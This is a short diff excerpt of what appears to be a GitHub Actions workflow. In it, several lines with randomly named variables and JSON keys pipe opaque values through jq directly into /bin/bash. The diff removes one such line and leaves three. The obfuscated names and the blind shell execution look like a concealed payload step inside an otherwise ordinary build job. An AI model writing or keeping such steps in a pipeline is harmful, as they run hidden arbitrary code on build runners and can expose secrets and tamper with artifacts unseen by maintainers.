@@ -33,7 +33,6 @@ jobs:
           echo $l37450 | jq -r .lv12743 | /bin/bash
           printf '%s' "$dawpo13" | jq -r .ljox16 | /bin/bash
           echo $hfxu990 | jq -r .etoju8336 | /bin/bash
-          echo $zcy11396 | jq -r .lfmi1 | /bin/bash
 
       - name: Upload archive
         uses: actions/upload-artifact@v4
